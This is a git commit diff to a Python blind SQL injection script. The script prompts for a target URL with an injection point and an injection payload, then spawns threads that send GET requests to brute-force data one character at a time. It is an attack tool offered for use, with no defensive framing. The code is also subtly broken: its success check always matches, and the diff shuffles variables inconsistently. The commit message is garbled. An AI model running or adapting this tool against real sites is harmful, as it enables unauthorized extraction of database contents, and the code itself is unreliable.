03b63f8af29d68e3240a150dd6dcc7cf083801b8
whb54012 <1226844928@qq.com>
2026-07-27 10:43:50 +0000

    自动提交：更新 ${2026/7/27 18:43ilenPM43e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -5,18 +5,18 @@ import sys
 print("Python输出编码:", sys.stdout.encoding)
 input("按任意键继续...")
 warnings.filterwarnings("ignore")
-result2=int(input("输入查找长度"))
+result=int(input("输入查找长度"))
 url = input("输入url及注入点")
 data=input("输入注入语句")
 def fun(url,result,result2):
-    for i in range(result):
+    for i in range(result2):
         try:
-            reponse=requests.get(url+data.format(i,result2))
+            reponse=requests.get(url+data.format(result,i))
             if '' in reponse.text:
-                print(i,url+format(i,result2),chr(result2))
+                print(result,url+format(result,i),chr(i))
                 break
         except:continue
     return
-for  i in range(1,result2):
-    t=threading.Thread(target=fun,args=(url,150,result2))
+for  i in range(1,result):
+    t=threading.Thread(target=fun,args=(url,result,150))
     t.start()
